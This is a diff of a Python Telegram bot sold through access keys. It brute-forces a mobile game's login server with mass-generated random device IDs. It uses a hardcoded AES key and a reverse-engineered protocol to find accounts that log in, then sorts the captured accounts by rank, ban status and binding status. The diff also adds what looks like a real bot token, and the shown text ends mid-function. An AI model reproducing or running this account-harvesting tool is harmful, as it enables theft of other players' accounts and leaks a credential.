@@ -1,282 +1,55 @@
 #!/usr/bin/env python3
 # ===================================================================
-# PREMIUM DEVID SEKER - TELEGRAM BOT v5.2
-# Added Stop Button for Brute Force
+# PREMIUM DEVID SEKER - TELEGRAM BOT SYSTEM v5.0
 # Created by: @ZyronDevv
+# Features: Key Access + Inline Buttons + Generator + Bulk Check
+#          + Single Check + Brute Force + Admin Panel
 # ===================================================================
 
-import os
-import sys
-import time
-import random
-import uuid
-import json
-import threading
-import socket
-import zlib
-import zstandard as zstd
-import struct
-import re
-import requests
-import asyncio
-import logging
+import os, sys, time, random, uuid, json, threading, socket, zlib, asyncio
+import struct, re, requests, shutil, glob
 from queue import Queue
 from enum import Enum
 from typing import Tuple, Dict, Any, List, Optional
-from Crypto.Cipher import AES
 from datetime import datetime, timezone, timedelta
-from dataclasses import dataclass, asdict
-from functools import wraps
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from Crypto.Cipher import AES
 
-# Telegram Bot Libraries
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
+try:
+    import zstandard as zstd
+except ImportError:
+    print("❌ Missing 'zstandard'. Install: pip install zstandard")
+    sys.exit(1)
+
+from telegram import (
+    Update, InlineKeyboardButton, InlineKeyboardMarkup,
+    ReplyKeyboardMarkup, ReplyKeyboardRemove, InputFile
+)
 from telegram.ext import (
-    Application,
-    CommandHandler,
-    CallbackQueryHandler,
-    MessageHandler,
-    filters,
-    ConversationHandler,
-    ContextTypes,
+    Application, CommandHandler, CallbackQueryHandler,
+    MessageHandler, filters, ContextTypes, ConversationHandler
 )
-from telegram.error import TimedOut, NetworkError, RetryAfter
+from telegram.constants import ParseMode, ChatAction
+import logging
+
+logging.getLogger("telegram").setLevel(logging.CRITICAL)
+logging.getLogger("httpx").setLevel(logging.CRITICAL)
 
 # ────────────────────────────────────────────────────────────────
-# LOGGING CONFIGURATION
-# ────────────────────────────────────────────────────────────────
-
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
-
-# ────────────────────────────────────────────────────────────────
-# BOT CONFIGURATION
-# ────────────────────────────────────────────────────────────────
-
-BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Replace with your bot token
-ADMIN_IDS = [8477982865]  # Your Telegram user ID
-
-# Key System Configuration
-KEY_FILE = "bot_keys.json"
-DEFAULT_KEY_EXPIRY = 7  # Days
-MAX_KEYS_PER_ADMIN = 50
-
-# Bot State Constants
-(MAIN_MENU, GENERATOR_MENU, CHECK_MENU, BRUTE_MENU, 
- SETTINGS_MENU, KEY_MENU, AWAITING_DEVICE, AWAITING_FILE,
- AWAITING_KEY, AWAITING_BRUTE_CONFIG) = range(10)
-
-# ────────────────────────────────────────────────────────────────
-# KEY MANAGEMENT SYSTEM
-# ────────────────────────────────────────────────────────────────
-
-@dataclass
-class BotKey:
-    key: str
-    created_by: int
-    created_at: str
-    expires_at: str
-    max_uses: int
-    used_count: int
-    is_active: bool = True
-    notes: str = ""
-    
-    def is_expired(self) -> bool:
-        if not self.expires_at:
-            return False
-        expiry = datetime.fromisoformat(self.expires_at)
-        return datetime.now() > expiry
-    
-    def can_use(self) -> bool:
-        return self.is_active and not self.is_expired() and self.used_count < self.max_uses
-    
-    def use(self) -> bool:
-        if not self.can_use():
-            return False
-        self.used_count += 1
-        if self.used_count >= self.max_uses:
-            self.is_active = False
-        return True
-
-class KeyManager:
-    def __init__(self, key_file: str = KEY_FILE):
-        self.key_file = key_file
-        self.keys: Dict[str, BotKey] = {}
-        self._load_keys()
-    
-    def _load_keys(self):
-        if os.path.exists(self.key_file):
-            try:
-                with open(self.key_file, 'r') as f:
-                    data = json.load(f)
-                    for key_str, key_data in data.items():
-                        self.keys[key_str] = BotKey(**key_data)
-            except Exception as e:
-                logger.error(f"Failed to load keys: {e}")
-                self.keys = {}
-    
-    def _save_keys(self):
-        try:
-            data = {k: asdict(v) for k, v in self.keys.items()}
-            with open(self.key_file, 'w') as f:
-                json.dump(data, f, indent=2)
-        except Exception as e:
-            logger.error(f"Failed to save keys: {e}")
-    
-    def generate_key(self, created_by: int, max_uses: int = 10, 
-                     expiry_days: int = DEFAULT_KEY_EXPIRY, 
-                     notes: str = "") -> Optional[str]:
-        if created_by not in ADMIN_IDS and created_by != 0:
-            return None
-        
-        admin_keys = [k for k in self.keys.values() if k.created_by == created_by and k.is_active]
-        if len(admin_keys) >= MAX_KEYS_PER_ADMIN and created_by != 0:
-            return None
-        
-        key_str = f"DEVID_{uuid.uuid4().hex[:16].upper()}"
-        expiry = datetime.now() + timedelta(days=expiry_days)
-        
-        new_key = BotKey(
-            key=key_str,
-            created_by=created_by,
-            created_at=datetime.now().isoformat(),
-            expires_at=expiry.isoformat(),
-            max_uses=max_uses,
-            used_count=0,
-            is_active=True,
-            notes=notes
-        )
-        
-        self.keys[key_str] = new_key
-        self._save_keys()
-        return key_str
-    
-    def validate_key(self, key_str: str) -> Optional[BotKey]:
-        key = self.keys.get(key_str)
-        if not key:
-            return None
-        if not key.can_use():
-            return None
-        return key
-    
-    def use_key(self, key_str: str, user_id: int) -> bool:
-        key = self.keys.get(key_str)
-        if not key:
-            return False
-        if not key.use():
-            return False
-        self._save_keys()
-        return True
-    
-    def revoke_key(self, key_str: str, admin_id: int) -> bool:
-        if admin_id not in ADMIN_IDS:
-            return False
-        key = self.keys.get(key_str)
-        if not key:
-            return False
-        key.is_active = False
-        self._save_keys()
-        return True
-    
-    def list_keys(self, admin_id: int) -> List[BotKey]:
-        if admin_id not in ADMIN_IDS:
-            return []
-        return [k for k in self.keys.values()]
-    
-    def get_stats(self) -> Dict:
-        total = len(self.keys)
-        active = len([k for k in self.keys.values() if k.is_active and not k.is_expired()])
-        expired = len([k for k in self.keys.values() if k.is_expired()])
-        used = len([k for k in self.keys.values() if k.used_count > 0])
-        total_uses = sum(k.used_count for k in self.keys.values())
-        return {
-            'total': total,
-            'active': active,
-            'expired': expired,
-            'used': used,
-            'total_uses': total_uses
-        }
-
-key_manager = KeyManager()
-
-# ────────────────────────────────────────────────────────────────
-# USER SESSION MANAGEMENT
-# ────────────────────────────────────────────────────────────────
-
-class UserSession:
-    def __init__(self, user_id: int):
-        self.user_id = user_id
-        self.authorized = False
-        self.auth_expiry = None
-        self.current_operation = None
-        self.data = {}
-        self.last_activity = datetime.now()
-    
-    def is_authorized(self) -> bool:
-        if not self.authorized:
-            return False
-        if self.auth_expiry and datetime.now() > self.auth_expiry:
-            self.authorized = False
-            return False
-        return True
-    
-    def authorize(self, key: BotKey):
-        self.authorized = True
-        self.auth_expiry = datetime.now() + timedelta(hours=24)
-        self.key_used = key.key
-
-class SessionManager:
-    def __init__(self):
-        self.sessions: Dict[int, UserSession] = {}
-        self._cleanup_lock = threading.Lock()
-        self._start_cleanup()
-    
-    def get_session(self, user_id: int) -> UserSession:
-        if user_id not in self.sessions:
-            self.sessions[user_id] = UserSession(user_id)
-        self.sessions[user_id].last_activity = datetime.now()
-        return self.sessions[user_id]
-    
-    def is_authorized(self, user_id: int) -> bool:
-        if user_id in ADMIN_IDS:
-            return True
-        session = self.get_session(user_id)
-        return session.is_authorized()
-    
-    def authorize(self, user_id: int, key: BotKey) -> bool:
-        session = self.get_session(user_id)
-        session.authorize(key)
-        return True
-    
-    def revoke(self, user_id: int):
-        if user_id in self.sessions:
-            self.sessions[user_id].authorized = False
-    
-    def _start_cleanup(self):
-        def cleanup():
-            while True:
-                time.sleep(3600)
-                with self._cleanup_lock:
-                    now = datetime.now()
-                    to_remove = []
-                    for uid, session in self.sessions.items():
-                        if (now - session.last_activity).seconds > 86400:
-                            to_remove.append(uid)
-                    for uid in to_remove:
-                        del self.sessions[uid]
-        threading.Thread(target=cleanup, daemon=True).start()
-
-session_manager = SessionManager()
-
-# ────────────────────────────────────────────────────────────────
-# ORIGINAL SCRIPT FUNCTIONS (ADAPTED)
+# 1. CONFIGURATION
 # ────────────────────────────────────────────────────────────────
 
 TZ_WIB = timezone(timedelta(hours=7))
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-OUTPUT_DIR = os.path.join(BASE_DIR, "BOT_OUTPUT")
+OUTPUT_DIR = os.path.join(BASE_DIR, "PREMIUM_DEVID_SEKER_OUTPUT")
+KEYS_FILE = os.path.join(BASE_DIR, "keys.json")
+USERS_FILE = os.path.join(BASE_DIR, "authorized_users.json")
+BF_LIMITS_FILE = os.path.join(BASE_DIR, "bf_limits.json")
+
+# === EDIT THESE ===
+BOT_TOKEN = "8692114721:AAFWynpnoKIza6ym4lv3EBomf4WJTmXJCpo"
+ADMIN_IDS = [8477982865]
+# ==================
 
 AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
 AES_IV = b'\x00' * 16
@@ -285,27 +58,20 @@ SERVER_PORT = 30021
 CLIENT_VERSION = '2.1.99.1205.1'
 CHANNEL = 'and_usa'
 LANGUAGE = 'en'
+AVG_BYTES_PER_LINE = 80
 
 HEX_CHARS = "0123456789abcdef"
-BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
 
 FOLDERS = {
-    "generated": "00_Generated",
-    "login": "01_Login_Success",
-    "detail": "03_Hasil_Detail_8Req",
-    "rank_warrior": "04_Rank_Warrior",
-    "rank_elite": "05_Rank_Elite",
-    "rank_master": "06_Rank_Master",
-    "rank_gm": "07_Rank_Grandmaster",
-    "rank_epic": "08_Rank_Epic",
-    "rank_legend": "09_Rank_Legend",
-    "rank_mythic": "10_Rank_Mythic",
-    "v2l_active": "11_V2L_Active",
-    "v2l_inactive": "12_V2L_Inactive",
-    "sultan": "13_Sultan",
-    "highrank": "14_HighRank",
-    "akun_tua": "15_Akun_Tua",
-    "error": "99_Error",
+    "generated": "00_Generated", "split": "00_Split_Devices",
+    "login": "01_Login_Success", "detail": "03_Hasil_Detail_8Req",
+    "rank_warrior": "04_Rank_Warrior", "rank_elite": "05_Rank_Elite",
+    "rank_master": "06_Rank_Master", "rank_gm": "07_Rank_Grandmaster",
+    "rank_epic": "08_Rank_Epic", "rank_legend": "09_Rank_Legend",
+    "rank_mythic": "10_Rank_Mythic", "v2l_active": "11_V2L_Active",
+    "v2l_inactive": "12_V2L_Inactive", "sultan": "13_Sultan",
+    "highrank": "14_HighRank", "akun_tua": "15_Akun_Tua",
+    "checkpoint": "98_Checkpoints", "error": "99_Error",
     "bruteforce": "00_BruteForce_Logs",
 }
 
@@ -315,7 +81,309 @@ def ensure_dirs():
         os.makedirs(os.path.join(OUTPUT_DIR, folder), exist_ok=True)
 ensure_dirs()
 
-# ─── SDP Protocol Classes ──────────────────────────────────────
+FILES = {
+    "generated_devices": os.path.join(OUTPUT_DIR, FOLDERS["generated"], "generated_devices.txt"),
+    "login_valid": os.path.join(OUTPUT_DIR, FOLDERS["login"], "login_valid_devices.txt"),
+    "all_hits_detail": os.path.join(OUTPUT_DIR, FOLDERS["detail"], "all_hits_detail.txt"),
+    "raw_devices_detail": os.path.join(OUTPUT_DIR, FOLDERS["detail"], "raw_devices_detail.txt"),
+    "checkpoint_file": os.path.join(OUTPUT_DIR, FOLDERS["checkpoint"], "scan_checkpoints.json"),
+    "error_log": os.path.join(OUTPUT_DIR, FOLDERS["error"], "error_log.txt"),
+    "bruteforce_log": os.path.join(OUTPUT_DIR, FOLDERS["bruteforce"], "bruteforce_session.txt"),
+}
+
+# ────────────────────────────────────────────────────────────────
+# 2. KEY ACCESS SYSTEM
+# ────────────────────────────────────────────────────────────────
+
+KEYS_LOCK = threading.Lock()
+USERS_LOCK = threading.Lock()
+BF_LIMITS_LOCK = threading.Lock()
+
+def load_json(filepath):
+    if not os.path.exists(filepath):
+        return {}
+    try:
+        with open(filepath, 'r', encoding='utf-8') as f:
+            return json.load(f)
+    except:
+        return {}
+
+def save_json(filepath, data):
+    with open(filepath, 'w', encoding='utf-8') as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
+
+def generate_key_code():
+    parts = []
+    for _ in range(4):
+        parts.append(''.join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ23456789", k=4)))
+    return "ZDSK-" + "-".join(parts)
+
+def create_key(duration_days: int, max_uses: int = 1, created_by: str = "admin") -> dict:
+    with KEYS_LOCK:
+        keys_db = load_json(KEYS_FILE)
+        key_code = generate_key_code()
+        while key_code in keys_db:
+            key_code = generate_key_code()
+        
+        now = datetime.now(TZ_WIB)
+        expires_at = None if duration_days == 0 else (now + timedelta(days=duration_days)).isoformat()
+        
+        key_data = {
+            "key": key_code,
+            "duration_days": duration_days,
+            "max_uses": max_uses,
+            "uses": 0,
+            "created_at": now.isoformat(),
+            "created_by": created_by,
+            "expires_at": expires_at,
+            "activated_by": [],
+            "status": "active",
+            "note": ""
+        }
+        keys_db[key_code] = key_data
+        save_json(KEYS_FILE, keys_db)
+        return key_data
+
+def is_key_valid(key_code: str) -> Tuple[bool, str]:
+    with KEYS_LOCK:
+        keys_db = load_json(KEYS_FILE)
+        if key_code not in keys_db:
+            return False, "❌ Key not found in database."
+        
+        key = keys_db[key_code]
+        if key["status"] != "active":
+            return False, f"❌ Key status: {key['status']}"
+        
+        if key["uses"] >= key["max_uses"]:
+            return False, "❌ Key has reached maximum uses."
+        
+        if key["expires_at"]:
+            exp = datetime.fromisoformat(key["expires_at"])
+            if datetime.now(TZ_WIB) > exp:
+                key["status"] = "expired"
+                save_json(KEYS_FILE, keys_db)
+                return False, "❌ Key has expired."
+        
+        return True, "✅ Key is valid."
+
+def redeem_key(key_code: str, user_id: int, username: str) -> Tuple[bool, str]:
+    key_code = key_code.strip().upper()
+    valid, msg = is_key_valid(key_code)
+    if not valid:
+        return False, msg
+    
+    with KEYS_LOCK:
+        keys_db = load_json(KEYS_FILE)
+        key = keys_db[key_code]
+        
+        if user_id in [u["user_id"] for u in key["activated_by"]]:
+            return False, "❌ You already redeemed this key."
+        
+        now = datetime.now(TZ_WIB)
+        if key["duration_days"] == 0:
+            user_expires = None
+        else:
+            user_expires = (now + timedelta(days=key["duration_days"])).isoformat()
+        
+        key["uses"] += 1
+        key["activated_by"].append({
+            "user_id": user_id,
+            "username": username,
+            "activated_at": now.isoformat()
+        })
+        if key["uses"] >= key["max_uses"]:
+            key["status"] = "used"
+        save_json(KEYS_FILE, keys_db)
+    
+    with USERS_LOCK:
+        users_db = load_json(USERS_FILE)
+        users_db[str(user_id)] = {
+            "user_id": user_id,
+            "username": username,
+            "key": key_code,
+            "activated_at": now.isoformat(),
+            "expires_at": user_expires,
+            "duration_days": key["duration_days"],
+            "status": "active"
+        }
+        save_json(USERS_FILE, users_db)
+    
+    return True, "✅ Key redeemed successfully!"
+
+def is_user_authorized(user_id: int) -> Tuple[bool, dict]:
+    if user_id in ADMIN_IDS:
+        return True, {"username": "Admin", "status": "admin", "expires_at": None}
+    
+    with USERS_LOCK:
+        users_db = load_json(USERS_FILE)
+        user = users_db.get(str(user_id))
+        if not user:
+            return False, {}
+        
+        if user.get("status") != "active":
+            return False, user
+        
+        if user.get("expires_at"):
+            exp = datetime.fromisoformat(user["expires_at"])
+            if datetime.now(TZ_WIB) > exp:
+                user["status"] = "expired"
+                users_db[str(user_id)] = user
+                save_json(USERS_FILE, users_db)
+                return False, user
+        
+        return True, user
+
+def get_user_expiry_info(user_id: int) -> str:
+    valid, user = is_user_authorized(user_id)
+    if user_id in ADMIN_IDS:
+        return "♾️ Lifetime (Admin)"
+    if not user:
+        return "❌ Not authorized"
+    
+    activated = user.get("activated_at", "N/A")
+    expires = user.get("expires_at")
+    
+    if expires:
+        exp_dt = datetime.fromisoformat(expires)
+        now = datetime.now(TZ_WIB)
+        remaining = exp_dt - now
+        days_left = remaining.days
+        hours_left = remaining.seconds // 3600
+        if days_left > 0:
+            remaining_str = f"{days_left}d {hours_left}h"
+        elif hours_left > 0:
+            remaining_str = f"{hours_left}h"
+        else:
+            remaining_str = f"{remaining.seconds // 60}m"
+        
+        return (f"🔑 Key: `{user.get('key', 'N/A')}`\n"
+                f"📅 Activated: {activated[:19]}\n"
+                f"⏰ Expires: {expires[:19]}\n"
+                f"⏳ Remaining: {remaining_str}")
+    else:
+        return f"🔑 Key: `{user.get('key', 'N/A')}`\n♾️ Lifetime access"
+
+def revoke_user_access(user_id: int) -> bool:
+    with USERS_LOCK:
+        users_db = load_json(USERS_FILE)
+        if str(user_id) in users_db:
+            users_db[str(user_id)]["status"] = "revoked"
+            save_json(USERS_FILE, users_db)
+            return True
+    return False
+
+def delete_key(key_code: str) -> bool:
+    with KEYS_LOCK:
+        keys_db = load_json(KEYS_FILE)
+        if key_code in keys_db:
+            del keys_db[key_code]
+            save_json(KEYS_FILE, keys_db)
+            return True
+    return False
+
+def list_all_keys() -> list:
+    with KEYS_LOCK:
+        return list(load_json(KEYS_FILE).values())
+
+def list_all_users() -> list:
+    with USERS_LOCK:
+        return list(load_json(USERS_FILE).values())
+
+# ────────────────────────────────────────────────────────────────
+# 2.5 BRUTE FORCE LIMITS SYSTEM
+# ────────────────────────────────────────────────────────────────
+
+def get_bf_limit(user_id: Optional[int] = None) -> int:
+    with BF_LIMITS_LOCK:
+        limits = load_json(BF_LIMITS_FILE)
+        if user_id is not None:
+            user_overrides = limits.get("user_overrides", {})
+            if str(user_id) in user_overrides:
+                return user_overrides[str(user_id)]
+        return limits.get("device_limit", 1)
+
+def set_bf_limit(limit: int) -> bool:
+    if limit < 0:
+        return False
+    with BF_LIMITS_LOCK:
+        limits = load_json(BF_LIMITS_FILE)
+        limits["device_limit"] = limit
+        save_json(BF_LIMITS_FILE, limits)
+        return True
+
+def set_user_bf_limit(user_id: int, limit: int) -> bool:
+    if limit < -1:
+        return False
+    with BF_LIMITS_LOCK:
+        limits = load_json(BF_LIMITS_FILE)
+        if "user_overrides" not in limits:
+            limits["user_overrides"] = {}
+        if limit == -1:
+            if str(user_id) in limits["user_overrides"]:
+                del limits["user_overrides"][str(user_id)]
+        else:
+            limits["user_overrides"][str(user_id)] = limit
+        save_json(BF_LIMITS_FILE, limits)
+        return True
+
+def get_user_bf_devices(user_id: int) -> List[str]:
+    with BF_LIMITS_LOCK:
+        limits = load_json(BF_LIMITS_FILE)
+        user_data = limits.get("users", {})
+        return user_data.get(str(user_id), [])
+
+def add_user_bf_device(user_id: int, device_id: str) -> bool:
+    with BF_LIMITS_LOCK:
+        limits = load_json(BF_LIMITS_FILE)
+        if "users" not in limits:
+            limits["users"] = {}
+        if str(user_id) not in limits["users"]:
+            limits["users"][str(user_id)] = []
+        if device_id not in limits["users"][str(user_id)]:
+            limits["users"][str(user_id)].append(device_id)
+            save_json(BF_LIMITS_FILE, limits)
+            return True
+        return False
+
+def clear_user_bf_devices(user_id: int) -> bool:
+    with BF_LIMITS_LOCK:
+        limits = load_json(BF_LIMITS_FILE)
+        if "users" in limits and str(user_id) in limits["users"]:
+            limits["users"][str(user_id)] = []
+            save_json(BF_LIMITS_FILE, limits)
+            return True
+        return False
+
+def reset_all_bf_devices() -> bool:
+    with BF_LIMITS_LOCK:
+        limits = load_json(BF_LIMITS_FILE)
+        limits["users"] = {}
+        save_json(BF_LIMITS_FILE, limits)
+        return True
+
+def get_user_bf_usage_stats(user_id: int) -> Tuple[int, int]:
+    devices = get_user_bf_devices(user_id)
+    limit = get_bf_limit(user_id)
+    return len(devices), limit
+
+def refund_user_bf_device(user_id: int, device_id: str) -> bool:
+    """Remove a device from user's used list (refund the usage)."""
+    with BF_LIMITS_LOCK:
+        limits = load_json(BF_LIMITS_FILE)
+        if "users" not in limits:
+            return False
+        uid = str(user_id)
+        if uid not in limits["users"]:
+            return False
+        if device_id in limits["users"][uid]:
+            limits["users"][uid].remove(device_id)
+            save_json(BF_LIMITS_FILE, limits)
+            return True
+        return False
+
+# ────────────────────────────────────────────────────────────────
+# 3. SDP PROTOCOL
+# ────────────────────────────────────────────────────────────────
 
 class SdpDataType(Enum):
     INTEGER_POSITIVE = 0
@@ -402,9 +470,16 @@ class SdpStruct(dict):
             self.data += self._write_varint(len(val))
             for item in val: self._pack_item(0, item)
         elif isinstance(val, dict):
-            self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
-            for k, v in sorted(val.items()): self._pack_item(k, v)
-            self.data += bytes([SdpDataType.STRUCT_END.value << 4])
+            if isinstance(val, SdpStruct):
+                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
+                for k, v in sorted(val.items()): self._pack_item(k, v)
+                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
+            else:
+                self._pack_header(tag, SdpDataType.DICT)
+                self.data += self._write_varint(len(val))
+                for k, v in sorted(val.items()):
+                    self._pack_item(0, k)
+                    self._pack_item(0, v)
         else:
             raise Exception("Unsupported type")
 
@@ -447,7 +522,9 @@ class SdpStruct(dict):
         if dtype == SdpDataType.STRUCT_END: return tag, SdpDataType.STRUCT_END
         raise Exception("Unknown data type")
 
-# ─── Game Connection Classes ──────────────────────────────────
+# ────────────────────────────────────────────────────────────────
+# 4. CONNECTION & GAME PROTOCOL
+# ────────────────────────────────────────────────────────────────
 
 class BaseConnection:
     def __init__(self, host: str, port: int):
@@ -459,8 +536,8 @@ class BaseConnection:
 
     def connect(self):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socket.settimeout(3)
         self.socket.connect((self.host, self.port))
-        self.socket.settimeout(5)
 
     def cleanup(self):
         if self.socket:
@@ -514,6 +591,8 @@ class BaseConnection:
         except: return None, None
 
 class GameLogin(BaseConnection):
+    __slots__ = ['device_id', 'imei', 'android', 'adid']
+    
     def __init__(self, device_id: str):
         super().__init__(SERVER_HOST, SERVER_PORT)
         self.device_id = device_id
@@ -542,6 +621,9 @@ class GameLogin(BaseConnection):
             self.cleanup()
 
 class GameConnection(BaseConnection):
+    __slots__ = ['device_id', 'imei', 'android', 'adid', 'account_id', 'session_key', 
+                 'zone_id', 'game_host', 'game_port', 'creation_ts', 'ban_status']
+    
     def __init__(self, device_id: str):
         super().__init__(SERVER_HOST, SERVER_PORT)
         self.device_id = device_id
@@ -604,7 +686,7 @@ class GameConnection(BaseConnection):
         self.send_data(10001, SdpStruct({
             0: self.account_id, 1: self.session_key, 2: self.zone_id, 4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id
         }))
-        for _ in range(5):
+        for _ in range(3):
             pid, res = self.recv_data()
             if pid == 10002: return True
             if pid in (-1, None): break
@@ -612,7 +694,7 @@ class GameConnection(BaseConnection):
 
     def check_ban_status(self) -> str:
         self.send_data(10101, SdpStruct({0: 0, 2: 2}))
-        for _ in range(3):
+        for _ in range(2):
             pid, res = self.recv_data()
             if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                 binfo = res[0]
@@ -626,7 +708,7 @@ class GameConnection(BaseConnection):
     def lookup_player(self, search_value: int):
         self.send_data(11153, SdpStruct({1: int(search_value)}))
         cnt = 0
-        for _ in range(8):
+        for _ in range(5):
             pid, res = self.recv_data()
             if pid in (-1, None): return None
             if pid == 11154: return res
@@ -637,7 +719,7 @@ class GameConnection(BaseConnection):
 
     def get_role_info(self, role_id: int, zone_id: int):
         self.send_data(10128, SdpStruct({1: int(role_id), 2: int(zone_id)}))
-        for _ in range(4):
+        for _ in range(3):
             pid, res = self.recv_data()
             if pid in (-1, None): break
             if pid == 10129: return res
@@ -645,16 +727,58 @@ class GameConnection(BaseConnection):
 
     def get_skin_role_info(self, role_id: int, zone_id: int):
         self.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
-        for _ in range(4):
+        for _ in range(3):
             pid, res = self.recv_data()
             if pid in (-1, None): break
             if pid == 10144: return res
         return None
 
+# ────────────────────────────────────────────────────────────────
+# 5. RANK MAPPING & V2L
+# ────────────────────────────────────────────────────────────────
+
+def map_rank(p) -> str:
+    if not p or not isinstance(p, (int, float)) or p <= 0:
+        return "Unranked"
+    p = int(p)
+    if p >= 136:
+        stars = p - 136
+        if stars >= 100: return f"Mythical Immortal ({stars}★)"
+        if stars >= 50: return f"Mythical Glory ({stars}★)"
+        if stars >= 25: return f"Mythical Honor ({stars}★)"
+        return f"Mythic ({stars}★)"
+    ranks = [
+        (105, "Legend", 5, ["V","IV","III","II","I"]),
+        (75, "Epic", 5, ["V","IV","III","II","I"]),
+        (45, "Grandmaster", 5, ["V","IV","III","II","I"]),
+        (25, "Master", 4, ["IV","III","II","I"]),
+        (10, "Elite", 3, ["IV","III","II","I"]),
+        (1, "Warrior", 3, ["III","II","I"]),
+    ]
+    for threshold, name, div_stars, div_names in ranks:
+        if p >= threshold:
+            offset = p - threshold
+            div_idx = min(len(div_names)-1, offset // div_stars)
+            star = (offset % div_stars) + 1
+            return f"{name} {div_names[div_idx]} ({star}★)"
+    return "Warrior III (1★)"
+
+def get_rank_category(rank_text: str) -> str:
+    rt = rank_text.lower()
+    if "warrior" in rt: return "warrior"
+    if "elite" in rt: return "elite"
+    if "grandmaster" in rt: return "gm"
+    if "master" in rt and "grand" not in rt: return "master"
+    if "epic" in rt: return "epic"
+    if "legend" in rt: return "legend"
+    if "mythic" in rt or "immortal" in rt or "glory" in rt or "honor" in rt:
+        return "mythic"
+    return "other"
+
 def get_v2l_status(conn, role_id: int, zone_id: int) -> str:
     try:
         conn.send_data(10208, SdpStruct({0: int(role_id), 1: int(zone_id)}))
-        for _ in range(3):
+        for _ in range(2):
             pid, res = conn.recv_data()
             if pid in (-1, None): break
             if pid == 10208 and res:
@@ -673,1461 +797,2391 @@ def get_v2l_status(conn, role_id: int, zone_id: int) -> str:
         pass
     return "N/A"
 
-def map_rank(p) -> str:
-    if not p or not isinstance(p, (int, float)) or p <= 0:
-        return "Unranked"
-    p = int(p)
-    
-    if p >= 136:
-        stars = p - 136
-        if stars >= 100: return f"Mythical Immortal ({stars}★)"
-        if stars >= 50: return f"Mythical Glory ({stars}★)"
-        if stars >= 25: return f"Mythical Honor ({stars}★)"
-        return f"Mythic ({stars}★)"
-    
-    ranks = [
-        (105, "Legend", 5, ["V","IV","III","II","I"]),
-        (75, "Epic", 5, ["V","IV","III","II","I"]),
-        (45, "Grandmaster", 5, ["V","IV","III","II","I"]),
-        (25, "Master", 4, ["IV","III","II","I"]),
-        (10, "Elite", 3, ["IV","III","II","I"]),
-        (1, "Warrior", 3, ["III","II","I"]),
-    ]
-    for threshold, name, div_stars, div_names in ranks:
-        if p >= threshold:
-            offset = p - threshold
-            div_idx = min(len(div_names)-1, offset // div_stars)
-            star = (offset % div_stars) + 1
-            return f"{name} {div_names[div_idx]} ({star}★)"
-    return "Warrior III (1★)"
+# ────────────────────────────────────────────────────────────────
+# 6. DEVICE GENERATOR
+# ────────────────────────────────────────────────────────────────
 
-def process_device_check(device_id: str) -> Dict[str, Any]:
-    """Check a single device and return results"""
-    result = {
-        'device_id': device_id,
-        'success': False,
-        'account_id': None,
-        'zone_id': None,
-        'nickname': None,
-        'level': None,
-        'rank': None,
-        'highest_rank': None,
-        'skin_count': 0,
-        'hero_count': 0,
-        'v2l_status': 'N/A',
-        'ban_status': 'NORMAL',
-        'created_at': None,
-        'error': None
+REAL_OEM_HASHES = [
+    "cd9e459ea708a948d5c2f5a6ca8838cf", "b7f9a1c2d3e4f5061728394a5b6c7d8e",
+    "a1c8f304e792b516d8e0349acb1527fe", "f29c4815a73b06de1928475bc0d1e2f3",
+    "e50b12789f4ca3612d8e057cb4a193fe", "d41d8cd98f00b204e9800998ecf8427e",
+]
+
+def random_hex(n: int) -> str:
+    return ''.join(random.choices(HEX_CHARS, k=n))
+
+GEN_FUNCS = {
+    "and_standard_full": lambda c: f"and_{random_hex(32)}{random_hex(16)}{uuid.uuid4()}\n",
+    "oem_full": lambda c: f"and_{random.choice(REAL_OEM_HASHES)}{random_hex(16)}{uuid.uuid4()}\n",
+    "oem_uuid": lambda c: f"and_{random.choice(REAL_OEM_HASHES)}-{uuid.uuid4()}\n",
+    "and_md5_uuid": lambda c: f"and_{random_hex(32)}-{uuid.uuid4()}\n",
+    "ios_standard": lambda c: f"ios_{str(uuid.uuid4()).upper()}\n",
+}
+
+REALISTIC_GENERATORS = [
+    GEN_FUNCS["and_standard_full"], GEN_FUNCS["oem_full"],
+    GEN_FUNCS["oem_uuid"], GEN_FUNCS["and_md5_uuid"],
+    GEN_FUNCS["ios_standard"]
+]
+
+def generate_worker(cycle_start, count, gen_idx_start, queue, generators):
+    fmt_count = len(generators)
+    cycle = cycle_start
+    idx = gen_idx_start
+    for _ in range(count):
+        idx = (idx + 1) % fmt_count
+        queue.put(generators[idx](cycle))
+        cycle += 1
+
+def writer_thread(queue, output_file):
+    buffer = []
+    buffer_size = 0
+    with open(output_file, "a", encoding="utf-8", buffering=8*1024*1024) as f:
+        while True:
+            item = queue.get()
+            if item is None: break
+            buffer.append(item)
+            buffer_size += len(item)
+            if buffer_size >= 8*1024*1024:
+                f.write(''.join(buffer))
+                buffer.clear()
+                buffer_size = 0
+        if buffer:
+            f.write(''.join(buffer))
+
+def run_generator(size_mb: float, threads: int = 16):
+    generators = REALISTIC_GENERATORS
+    target_lines = int((size_mb * 1024 * 1024) / AVG_BYTES_PER_LINE * 1.02)
+    output_file = FILES["generated_devices"]
+    if os.path.exists(output_file): os.remove(output_file)
+    queue = Queue(maxsize=100000)
+    writer = threading.Thread(target=writer_thread, args=(queue, output_file))
+    writer.start()
+    executor = ThreadPoolExecutor(max_workers=threads)
+    tasks = []
+    chunk_size = 50000
+    fmt_count = len(generators)
+    lines_left = target_lines
+    cycle, idx = 1, 0
+    while lines_left > 0:
+        take = min(chunk_size, lines_left)
+        tasks.append(executor.submit(generate_worker, cycle, take, idx, queue, generators))
+        idx += take
+        cycle += idx // fmt_count
+        idx %= fmt_count
